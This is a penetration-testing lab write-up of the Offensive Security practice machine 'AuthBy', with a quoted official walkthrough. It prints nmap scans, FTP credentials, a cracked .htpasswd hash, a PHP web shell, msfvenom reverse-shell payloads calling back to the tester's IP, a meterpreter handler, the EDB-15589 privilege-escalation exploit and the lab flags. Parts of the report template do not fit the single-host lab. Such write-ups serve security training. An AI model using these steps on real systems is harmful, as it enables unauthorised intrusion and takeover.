# AuthBy
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On 1 August 2021, Victor Fernandez III performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the THINC.local domain. During the penetration test, Victor was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| 2010-3888 <br> 2010-3338 | EDB-ID-15589 |

## Recommendations
Victor recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
Victor used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of Victor's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The purpose of the reconnaissance phase of a penetration test is to identify information and sytems that represent the organization online and then, discover possible attack vectors. For this penetration test, Victor was asked to narrow his information gathering objectives to collecting the details below. 

### General Information
* Hostname: AuthBy
* Description: Enumeration and pillaging like bandits in the old country.
* IP Address: 192.168.51.46 
* MAC Address: (ref:) 
* Domain: WORKGROUP
* Distro: Microsoft Windows Server 2008 Standard (ref: rdesktop)
* Kernel: 6.0.6001 Service Pack 1 Build 6001 (ref: systeminfo via LFI)
* Architecture: (ref:)

### Ports
```bash
# Nmap 7.91 scan initiated Tue Jul 13 07:56:12 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/authby-nmap-complete 192.168.51.46
Nmap scan report for 192.168.51.46
Host is up (0.080s latency).
Not shown: 65535 open|filtered ports, 65531 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
242/tcp  open  direct
3145/tcp open  csi-lfap
3389/tcp open  ms-wbt-server

# Nmap done at Tue Jul 13 08:00:24 2021 -- 1 IP address (1 host up) scanned in 252.19 seconds
```

### Service Versions
```bash
# Nmap 7.91 scan initiated Tue Jul 13 08:02:49 2021 as: nmap -sV -sC -pT:21,242,3145,3389 -oN scans/authby-nmap-versions 192.168.51.46
Nmap scan report for 192.168.51.46
Host is up (0.078s latency).

PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Jul 13 18:56 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Mar 31 06:42 accounts
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
|_http-title: 401 Authorization Required
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2021-03-09T19:01:52
|_Not valid after:  2021-09-08T19:01:52
|_ssl-date: 2021-07-13T12:03:09+00:00; -3s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -3s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 13 08:03:12 2021 -- 1 IP address (1 host up) scanned in 23.47 seconds
```

### Operating System
```bash
# Nmap 7.91 scan initiated Tue Jul 13 08:11:51 2021 as: nmap -O -oN scans/authby-nmap-os 192.168.51.46
Nmap scan report for 192.168.51.46
Host is up (0.073s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
3389/tcp open  ms-wbt-server
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2012|8|Phone|2008|7|8.1|Vista (92%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 13 08:12:03 2021 -- 1 IP address (1 host up) scanned in 11.89 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### FTP
Victor was able to list files shared via FTP on TCP port 21 using anonymous credentials. 

* Admin
* Anonymous
* OffSec

```bash
cd loot
touch README.too # create a file
ftp $TARGET 21 # login using anonymous:anonymous
```

```bash
ls 

# output
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 9680
----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
----------   1 root     root           25 Feb 10  2011 UninstallService.bat
----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
----------   1 root     root           17 Aug 13  2011 StopService.bat
----------   1 root     root           18 Aug 13  2011 StartService.bat
----------   1 root     root         8736 Nov 09  2011 Settings.ini
dr-xr-xr-x   1 root     root          512 Jul 13 19:26 log
----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
----------   1 root     root           23 Feb 10  2011 InstallService.bat
dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
dr-xr-xr-x   1 root     root          512 Mar 31 06:42 accounts
226 Closing data connection.
```

He discovered evidence suggesting there are the accounts below on the target. 
```bash
cd accounts
ls 

# output
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 4
dr-xr-xr-x   1 root     root          512 Mar 31 06:42 backup
----------   1 root     root          764 Jul 13 19:26 acc[Offsec].uac
----------   1 root     root         1032 Jul 13 19:05 acc[anonymous].uac
----------   1 root     root          926 Jul 13 19:28 acc[admin].uac
226 Closing data connection.
```

Yet, he was unable to read or write to the FTP server using anonymous:anonymous.
```bash
cd .. # return to the original directory
prompt # turn-off prompting
mget * # download everything

# output
200 PORT Command successful.
550 Access denied
```

```bash
binary 
put README.too # upload file created above (i.e. check if we have write privileges)

# output
200 PORT Command successful.
550 Access denied
```

When Victor logged-in as admin using admin as the password, he was allowed to read/download the files below. Of note, the .htaccess file not only suggests the offsec account is required to login to TCP port 242, but the working directory for the HTTP server is `c:\wamp\www\`.
```bash
.htaccess
# output
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>

.htpasswd
# output
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0

cat index.php
# output
<center><pre>Qui e nuce nuculeum esse volt, frangit nucem!</pre></center>
```

Victor was also able to write to the directory and upload a file he eventually used as an LFI exploit.
```bash
vim cmd.php # <? php echo shell_exec($_GET['cmd']); ?>
ftp 192.168.51.46 21
binary
put cmd.php
exit
```

### HTTP
Along with a username/password prompt, the following was displayed attempting to access TCP port 242. 
```bash
firefox http://192.168.51.46:242

# Qui e nuce nuculeum esse volt, frangit nucem!
# Translated: He who would eat the kernel of a nut, breaks the nut!
```

```bash
curl "http://192.168.41.46:242/cmd.php?cmd=whoami"
```

### SQL
```bash
mysql -u $USER -h $TARGET

# output
NSTR
```

### RDP
```bash
# Nmap 7.91 scan initiated Tue Jul 13 08:22:17 2021 as: nmap -p3389 --script rdp-ntlm-info -oN scans/authby-nmap-scripts-rdp-ntlm-info 192.168.51.46
Nmap scan report for 192.168.51.46
Host is up (0.084s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

# Nmap done at Tue Jul 13 08:22:19 2021 -- 1 IP address (1 host up) scanned in 2.75 seconds
```

```bash
rdesktop -u administrator $TARGET

# output
Microsoft Windows Server 2008 Standard
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, Victor was able to successfully gain access to 10 out of the 50 systems.

### Password Guessing  
```bash
cp .htpasswd hash.txt
hashid hash.txt

--File 'hash.txt'--
Analyzing '$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0'
[+] MD5(APR) 
[+] Apache MD5 
--End of file 'hash.txt'--
```

Victor was able to guess the plain-text version of the hash above using John. The password works on TCP port 242, but not TCP port 21 (FTP) or 3389 (RDP).
```bash
john hash.txt /usr/share/wordlists/rockyou.txt

# output
elite
```

Login as offsec to leverage an LFI as apache.
```bash
curl -u offsec:elite "http://192.168.51.46:242/cmd.php?cmd=type+c:\users\apache\Desktop\local.txt"
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.51 LPORT=242 -f exe -o rshell.exe 
```

```bash
ftp 192.168.51.46 21
binary
put rshell.exe
exit
```

```bash
sudo nc -nvlp 242
curl -u offsec:elite "http://192.168.51.46:242/cmd.php?cmd=c:\\wamp\\www\\rshell.exe"
whoami

# output
livda\apache
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. Victor added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

### Privilege Escalation
```bash
net user

# output
User accounts for \\LIVDA

-------------------------------------------------------------------------------
Administrator            apache                   Guest                    
The command completed successfully.
```

The presence of a folder under the Users directory suggests there was another user on the target who has since been deleted.
```bash
cd c:\
dir c:\users

# output
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of c:\users

07/14/2021  10:27 PM    <DIR>          .
07/14/2021  10:27 PM    <DIR>          ..
02/14/2010  05:16 PM    <DIR>          Administrator
11/08/2011  05:34 AM    <DIR>          apache
01/19/2008  02:40 AM    <DIR>          Public
03/30/2020  06:32 AM    <DIR>          test123 # <--- notice the date
               0 File(s)              0 bytes
               7 Dir(s)   6,025,224,192 bytes free
```

After manual browsing of the filesystem, Victor noticed an oddly named file with the same date of the folder highlighted above.
```bash
cd c:\wamp\bin\apache\Apache2.2.21\
dir 

# output
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of c:\wamp\bin\apache\Apache2.2.21

03/30/2020  06:30 AM    <DIR>          .
03/30/2020  06:30 AM    <DIR>          ..
09/26/2011  09:50 AM            15,159 ABOUT_APACHE.txt
11/08/2011  04:37 AM    <DIR>          bin
11/08/2011  04:36 AM    <DIR>          cgi-bin
09/26/2011  09:50 AM           121,134 CHANGES.txt
11/08/2011  04:36 AM    <DIR>          conf
11/08/2011  04:36 AM    <DIR>          error
11/08/2011  04:36 AM    <DIR>          htdocs
11/08/2011  04:36 AM    <DIR>          icons
11/08/2011  04:36 AM    <DIR>          include
09/26/2011  09:50 AM             4,835 INSTALL.txt
11/08/2011  04:36 AM    <DIR>          lib
09/26/2011  09:50 AM            36,679 LICENSE.txt
11/09/2011  06:45 AM    <DIR>          logs
11/08/2011  04:36 AM    <DIR>          manual
11/08/2011  04:36 AM    <DIR>          modules
09/26/2011  09:50 AM             1,323 NOTICE.txt
09/26/2011  09:50 AM            26,498 OPENSSL-NEWS.txt
09/26/2011  09:50 AM            10,734 OPENSSL-README.txt
09/26/2011  09:50 AM             2,608 README-win32.txt
09/26/2011  09:50 AM             6,094 README.txt
12/31/2010  10:39 AM               330 wampserver.conf
03/30/2020  06:30 AM             3,858 wDw00t.xml # <--- notice the date
              11 File(s)        229,252 bytes
              13 Dir(s)   6,025,224,192 bytes free
```

```bash
type wDw00t.xml

# output
</Task>ncipals>>>InteractiveToken</LogonType>Temp\xpl.bat</Command>4/02/mit/task">
```

After conducting research online, it appears these two artifacts are left from an exploit known as EDB-ID-15589.
```bash
mkdir edb-id-15589
cd edb-id-15589
searchsploit -m 15589
ftp 192.168.51.46 21 # admin:admin
binary
put 15589.wsf
exit
```

```bash
cd c:\wamp\www
cscript 15589.wsf
net user

# output
User accounts for \\LIVDA

-------------------------------------------------------------------------------
Administrator            apache                   Guest                    
victor                   
The command completed successfully.
```

```bash
rdesktop 192.168.51.46 # victor:password
```

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, Victor removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Tools Used
* Nmap
* Patator
* Intruder from Burp Suite

## Hints
* Be sure to scan all TCP ports. FTP service allows anonymous login. Enumerate FTP contents and see what you can find.
* Find another FTP user and brute-force their password. Check what is in their directory. You can upload a shell and trigger it in a web app.
* Enumerate the operating system version. There is a local privilege escalation exploit for it. 

## Flags
* local.txt = 001b4a6ab787cbea4b0da63d9fdd0e35
* proof.txt = 51e6eb61669a4bcac11a49219dcf71db

## Lessons Learned
* curl: use + where there are spaces and escape (with \) if there is a slash at the end of your query.
* curl: to supply Basic Auth, use -u username:password. ex: curl -u admin:password http://localhost/login.php
* Always keep your privesc checks simple, this exploit could have been found by researching the OS version. Follow your PWK guide.
* Use cscript to execute .wsf files.

## Official Walkthrough
```bash
Exploitation Guide for AuthBy
Summary

We will initially exploit this machine through Anonymous FTP. After logging in as the anonymous FTP user, we will deduce the password of the admin FTP account. We’ll then use this account to discover additional system credentials which we’ll use to trigger our uploaded reverse shell. Finally, we’LL escalate with a local privilege escalation exploit.
Enumeration
Nmap

We’ll begin with an nmap scan.

kali@kali:~$ sudo nmap -p- 192.168.68.46
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-27 17:32 UTC
Nmap scan report for 192.168.68.46
Host is up (0.031s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
242/tcp  open  direct
3145/tcp open  csi-lfap
3389/tcp open  ms-wbt-server

Next, we’ll launch an aggressive scan against the discovered open ports.

kali@kali:~$ sudo nmap -A -sV -p 21,242,3145,3389 192.168.68.46
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-27 17:37 UTC
Nmap scan report for 192.168.68.46
Host is up (0.037s latency).

PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Dec 28 01:37 log
| ----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Aug 13 04:13 accounts
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
|_http-title: 401 Authorization Required
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2020-12-27T17:38:21+00:00
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2020-03-23T12:57:25
|_Not valid after:  2020-09-22T12:57:25
|_ssl-date: 2020-12-27T17:38:26+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

The results indicate that the FTP server allows anonymous authentication. In addition, an Apache web server is running on port 242.
FTP Enumeration

Since FTP appears to be wide-open, let’s log in as the anonymous user and enumerate available files and directories.

kali@kali:~$ ftp 192.168.68.46
Connected to 192.168.68.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.68.46:kali): anonymous
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 9680
----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
----------   1 root     root           25 Feb 10  2011 UninstallService.bat
----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
----------   1 root     root           17 Aug 13  2011 StopService.bat
----------   1 root     root           18 Aug 13  2011 StartService.bat
----------   1 root     root         8736 Nov 09  2011 Settings.ini
dr-xr-xr-x   1 root     root          512 Dec 28 01:37 log
----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
----------   1 root     root           23 Feb 10  2011 InstallService.bat
dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
dr-xr-xr-x   1 root     root          512 Aug 13 04:13 accounts
226 Closing data connection.
ftp>

The accounts directory looks interesting and is worth exploring.

ftp> cd accounts
250 CWD Command successful.
ftp> dir
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 4
dr-xr-xr-x   1 root     root          512 Aug 13 04:13 backup
----------   1 root     root          764 Aug 13 04:13 acc[Offsec].uac
----------   1 root     root         1030 Dec 28 01:38 acc[anonymous].uac
----------   1 root     root          926 Aug 13 04:13 acc[admin].uac
226 Closing data connection.
ftp> exit
221 Goodbye.
kali@kali:~$

This directory contains a UAC account file for the admin user.
Exploitation
FTP User Login Brute-Force

Let’s brute-force the admin account with hydra and the rockyou.txt wordlist.

kali@kali:~$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -f ftp://192.168.68.46
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-27 17:43:40
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344402 login tries (l:1/p:14344402), ~896526 tries per task
[DATA] attacking ftp://192.168.68.46:21/
[21][ftp] host: 192.168.68.46   login: admin   password: admin
[STATUS] attack finished for 192.168.68.46 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-27 17:43:44
kali@kali:~$

This reveals that the password is admin.
Further FTP Enumeration

We can now log in to FTP with the admin:admin credentials and enumerate further.

kali@kali:~$ ftp 192.168.68.46
Connected to 192.168.68.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.68.46:kali): admin
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
ftp>

Inside this user’s directory, we find three files: index.php, .htpasswd, and .htaccess. Let’s download them to our attack machine for closer inspection.

ftp> get index.php
local: index.php remote: index.php
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
76 bytes received in 0.10 secs (0.7232 kB/s)
ftp> get .htpasswd
local: .htpasswd remote: .htpasswd
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
45 bytes received in 0.11 secs (0.4185 kB/s)
ftp> get .htaccess
local: .htaccess remote: .htaccess
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
161 bytes received in 0.10 secs (1.5832 kB/s)
ftp> bye
221 Goodbye.
kali@kali:~$

The index.php file doesn’t contain anything of value.

The .htpasswd file contains a password hash for the offsec user.

kali@kali:~$ cat .htpasswd 
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0

The .htaccess file indicates that the .htpasswd file is used for authentication.

kali@kali:~$ cat .htaccess
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>kali@kali:~$

This means that if we crack the hash, we can authenticate as the offsec user.
Password Cracking

We can use john to attempt to crack the retrieved password hash.

kali@kali:~$ john .htpasswd --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
elite            (offsec)
1g 0:00:00:00 DONE (2020-12-27 17:56) 8.333g/s 211200p/s 211200c/s 211200C/s 191192..260989
Use the "--show" option to display all of the cracked passwords reliably
Session completed
kali@kali:~$

We discover that the password for the offsec user is elite.
PHP Reverse Shell

Since we discovered a PHP file on the server, it is reasonable to assume that the server can interpret and process PHP files. We can try to upload a PHP reverse shell. First, we’ll generate the payload.

kali@kali:~$ msfvenom -p php/meterpreter/reverse_tcp -f raw lhost=192.168.49.68 lport=443 > pwn.php

[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1113 bytes

Next, we’ll log back in to FTP as admin and upload the malicious PHP file.

kali@kali:~$ ftp 192.168.68.46
Connected to 192.168.68.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.68.46:kali): admin
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
ftp> put pwn.php
local: pwn.php remote: pwn.php
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
1113 bytes sent in 0.00 secs (14.9499 MB/s)
ftp> dir
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 5
-r--r--r--   1 root     root         1113 Dec 28 02:08 pwn.php
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
ftp> bye
221 Goodbye.
kali@kali:~$

Let’s set up our meterpreter listener and trigger the reverse shell by connecting on port 242 with the recovered credentials of offsec:elite.

kali@kali:~$ msfconsole
...
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.49.68
LHOST => 192.168.49.68
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.68:443 

Now, we’ll trigger our reverse shell.

kali@kali:~$ curl --user offsec:elite 192.168.68.46:242/pwn.php

The listener indicates that we have received our shell.

msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.68:443 
[*] Sending stage (38288 bytes) to 192.168.68.46
[*] Meterpreter session 1 opened (192.168.49.68:443 -> 192.168.68.46:49167) at 2020-12-27 18:14:21 +0000

meterpreter > getuid
Server username: apache (0)
meterpreter >

Escalation
Local Enumeration

Next, we’ll perform local enumeration in the hopes of escalating our privileges. We’ll begin by enumerating the operating system version.

meterpreter > sysinfo 
Computer    : LIVDA
OS          : Windows NT LIVDA 6.0 build 6001 (Windows Server 2008 Standard Edition Service Pack 1) i586
Meterpreter : php/windows
meterpreter >

According to the Exploit Database, this machine is vulnerable to a Task Scheduler Privilege Escalation exploit.

kali@kali:~$ searchsploit ""Privilege Escalation"" | uniq | grep -v metasploit | grep -i ""windows ""
Fortinet FortiClient 5.2.3 (Windows 10 x64 Creators) - Local Privilege E | exploits/windows_x86-64/local/45149.cpp
Fortinet FortiClient 5.2.3 (Windows 10 x64 Post-Anniversary) - Local Pri | exploits/windows_x86-64/local/41722.c
Fortinet FortiClient 5.2.3 (Windows 10 x64 Pre-Anniversary) - Local Priv | exploits/windows_x86-64/local/41721.c
Fortinet FortiClient 5.2.3 (Windows 10 x86) - Local Privilege Escalation | exploits/windows_x86/local/41705.cpp

...

Microsoft Windows - Task Scheduler Privilege Escalation                  | exploits/windows/local/15589.wsf

...

Windows - NtUserSetWindowFNID Win32k User Callback Privilege Escalation  | exploits/windows/local/47134.rb
Windows - Shell COM Server Registrar Local Privilege Escalation          | exploits/windows/local/47880.cc
XAMPP for Windows 1.6.3a - Local Privilege Escalation                    | exploits/windows/local/4325.php

Task Scheduler Privilege Escalation Exploit

Let’s copy the exploit file to a directory on our attack machine.

kali@kali:~$ file /usr/share/exploitdb/exploits/windows/local/15589.wsf
/usr/share/exploitdb/exploits/windows/local/15589.wsf: HTML document, ASCII text, with CRLF line terminators

kali@kali:~$ cp /usr/share/exploitdb/exploits/windows/local/15589.wsf .

This exploit creates a new user (test123) with a matching password (test123) and adds the user to the Administrators group:

a.WriteLine (""net user /add test123 test123"")
a.WriteLine (""net localgroup administrators /add test123"")

Let’s upload the exploit using our meterpreter session and then execute it on the target.

meterpreter > ls
Listing: C:\wamp\www
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  161   fil   2011-11-08 15:58:11 +0000  .htaccess
100666/rw-rw-rw-  45    fil   2011-11-08 15:53:09 +0000  .htpasswd
100666/rw-rw-rw-  76    fil   2011-11-08 15:45:29 +0000  index.php
100666/rw-rw-rw-  1113  fil   2020-12-27 18:08:12 +0000  pwn.php

meterpreter > upload 15589.wsf /Users/apache/Desktop/
[*] uploading  : 15589.wsf -> /Users/apache/Desktop/
[*] uploaded   : 15589.wsf -> /Users/apache/Desktop/\15589.wsf
meterpreter > execute -f cscript -a C:/Users/apache/Desktop/15589.wsf
Process 2868 created.
meterpreter >

After the exploit has completed, we can connect to remote desktop with test123:test123.

kali@kali:~$ rdesktop 192.168.68.46 -u test123 -p test123
Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses and invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.

     Issuer: CN=LIVDA

 2. Certificate has expired.

     Valid to: Tue Sep 22 12:57:25 2020



Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate the connection atempt will be aborted:

    Subject: CN=LIVDA
     Issuer: CN=LIVDA
 Valid From: Mon Mar 23 12:57:25 2020
         To: Tue Sep 22 12:57:25 2020

  Certificate fingerprints:

       sha1: 92f40781ed691eb1f4a5463fa1c7a36661dce8a0
